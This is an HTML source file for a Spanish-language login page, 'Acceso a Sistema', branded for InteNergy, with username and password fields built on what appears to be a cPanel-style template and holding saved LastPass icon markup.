<!DOCTYPE html>
<html lang="es_es" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
    <title>Acceso a Sistema</title>
    <!-- EXTERNAL CSS -->
    <link href="./css/open_sans.min.css" rel="stylesheet" type="text/css">
    <link href="./css/style_v2_optimized.css" rel="stylesheet" type="text/css">
 
    <script src="librerias/jquery-3.2.1.min.js"></script>
	<script src="js/funciones.js"></script>
	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <script>
        window.DOM = { get: function(id) { return document.getElementById(id) } };
    </script>
</head>
<body style="background: #04101a;background: linear-gradient(90deg,rgba(4, 16, 26, 1) 0%, rgba(4, 39, 46, 1) 50%, rgba(10, 51, 89, 1) 100%);"  class="cp"><div id="preload_images"></div>
  
<!-- Do not remove msg_code as it is needed for automated testing - msg_code:[]  -->
<div id="login-wrapper" class="group " style="opacity: 1; visibility: visible;">
    <div class="wrapper">
    <div id="notify"> 
        <div id="login-status" class="error-notice" style="visibility: hidden">
            <div class="content-wrapper">
                <div id="login-detail">
                    <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
                    <div id="login-status-message">Se ha cerrado su sesión.</div>
                </div>
            </div>
        </div>
        <div id="IE-warning" class="warn-notice IE-warning-hide" style="display: none">
            <div class="content-wrapper">
                <div id="IE-warning-detail">
                    <div id="IE-warning-icon-container"><span class="IE-warning-icon"></span></div> 
                </div>
            </div>
        </div>
    </div>

    <div style="display:none">
        <div id="locale-container" style="visibility:hidden">
            <div id="locale-inner-container">
                <div id="locale-header">
                    <div class="locale-head">Seleccione una configuración regional:</div>
                    <div class="close"><a href="javascript:void(0)" onclick="toggle_locales(false)">X Cerrar</a></div>
                </div> 
            </div>
        </div>
    </div>
    <div id="content-container">
        <div id="login-container">

            <div id="login-sub-container">
                    <div id="login-sub-header"> 
                        <img class="main-logo" src="./img/InteNergy.jpg" alt="logo"> 
                    </div>
                    <div id="login-sub">
                        <div id="clickthrough_form" style="visibility:hidden">
                            <form action="javascript:void(0)">
                                <div class="notices"></div>
                                <button type="submit" class="clickthrough-cont-btn">Continuar</button>
                            </form>
                        </div>
                        <div id="forms">
                            <form novalidate="" id="login_form" method="post" style="visibility:">
                                <div class="input-req-login"><label style="color: wheat;" for="user">Nombre de usuario</label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="user" id="user" autofocus="autofocus" value="" placeholder="Indique su nombre de usuario." class="std_textbox" type="text" tabindex="1" data-testid="user" required="">
                                <div data-lastpass-icon-root="" style="position: relative !important; height: 0px !important; width: 0px !important; float: left !important;"><template shadowrootmode="closed"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" data-lastpass-icon="true" style="position: absolute; cursor: pointer; height: 20px; max-height: 20px; width: 22px; max-width: 22px; top: 6px; left: 235px; z-index: auto; color: rgb(186, 192, 202);"><rect x="0.680176" y="0.763062" width="22.6392" height="22.4737" rx="4" fill="currentColor"></rect><path fill-rule="evenodd" clip-rule="evenodd" d="M19.7935 7.9516C19.7935 7.64414 20.0427 7.3949 20.3502 7.3949C20.6576 7.3949 20.9069 7.64414 20.9069 7.9516V16.0487C20.9069 16.3562 20.6576 16.6054 20.3502 16.6054C20.0427 16.6054 19.7935 16.3562 19.7935 16.0487V7.9516Z" fill="white"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M4.76288 13.6577C5.68525 13.6577 6.43298 12.9154 6.43298 11.9998C6.43298 11.0842 5.68525 10.3419 4.76288 10.3419C3.8405 10.3419 3.09277 11.0842 3.09277 11.9998C3.09277 12.9154 3.8405 13.6577 4.76288 13.6577Z" fill="white"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M10.3298 13.6577C11.2521 13.6577 11.9999 12.9154 11.9999 11.9998C11.9999 11.0842 11.2521 10.3419 10.3298 10.3419C9.4074 10.3419 8.65967 11.0842 8.65967 11.9998C8.65967 12.9154 9.4074 13.6577 10.3298 13.6577Z" fill="white"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M15.8964 13.6577C16.8188 13.6577 17.5665 12.9154 17.5665 11.9998C17.5665 11.0842 16.8188 10.3419 15.8964 10.3419C14.974 10.3419 14.2263 11.0842 14.2263 11.9998C14.2263 12.9154 14.974 13.6577 15.8964 13.6577Z" fill="white"></path></svg></template></div></div>
                                <div class="input-req-login login-password-field-label"><label style="color: wheat;" for="pass">Contraseña</label></div>
                                <div class="input-field-login icon password-container">
                                    <input name="pass" id="pass" placeholder="Indique la contraseña de su cuenta." class="std_textbox" type="password" tabindex="2" data-testid="pass" required="">
                                <div data-lastpass-icon-root="" style="position: relative !important; height: 0px !important; width: 0px !important; float: left !important;"><template shadowrootmode="closed"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" data-lastpass-icon="true" style="position: absolute; cursor: pointer; height: 20px; max-height: 20px; width: 22px; max-width: 22px; top: 6px; left: 235px; z-index: auto; color: rgb(186, 192, 202);"><rect x="0.680176" y="0.763062" width="22.6392" height="22.4737" rx="4" fill="currentColor"></rect><path fill-rule="evenodd" clip-rule="evenodd" d="M19.7935 7.9516C19.7935 7.64414 20.0427 7.3949 20.3502 7.3949C20.6576 7.3949 20.9069 7.64414 20.9069 7.9516V16.0487C20.9069 16.3562 20.6576 16.6054 20.3502 16.6054C20.0427 16.6054 19.7935 16.3562 19.7935 16.0487V7.9516Z" fill="white"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M4.76288 13.6577C5.68525 13.6577 6.43298 12.9154 6.43298 11.9998C6.43298 11.0842 5.68525 10.3419 4.76288 10.3419C3.8405 10.3419 3.09277 11.0842 3.09277 11.9998C3.09277 12.9154 3.8405 13.6577 4.76288 13.6577Z" fill="white"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M10.3298 13.6577C11.2521 13.6577 11.9999 12.9154 11.9999 11.9998C11.9999 11.0842 11.2521 10.3419 10.3298 10.3419C9.4074 10.3419 8.65967 11.0842 8.65967 11.9998C8.65967 12.9154 9.4074 13.6577 10.3298 13.6577Z" fill="white"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M15.8964 13.6577C16.8188 13.6577 17.5665 12.9154 17.5665 11.9998C17.5665 11.0842 16.8188 10.3419 15.8964 10.3419C14.974 10.3419 14.2263 11.0842 14.2263 11.9998C14.2263 12.9154 14.974 13.6577 15.8964 13.6577Z" fill="white"></path></svg></template></div></div>
                                <div class="controls">
                                    <div class="login-btn">
                                        <button name="login" type="submit" id="login_submit" tabindex="3" data-testid="login_submit">Iniciar sesión</button>
                                    </div>                         </div>
                                <div class="clear" id="push"></div>
                            </form> 
                        </div> 
                    </div> 
                </div> 
            </div> 
    </div>
<!--Close login-wrapper -->
</div>  
<style>
    @media (min-width: 481px) {
        #select_user_form {
            width: px;
        }
    }
	header, img { 
    margin-top: -74px !Important; 
    }
	img.main-logo{
	    height: 130px!important;
		border-radius: 12% !Important;
		width: 200px !Important;
	}
</style>
    <div  style="color: wheat;"class="copyright">intenergy @2025.
    <br><a style="color: wheat;" href="https://intenergy.com.ec/" target="_blank">Directiva de privacidad</a></div>
</body></html>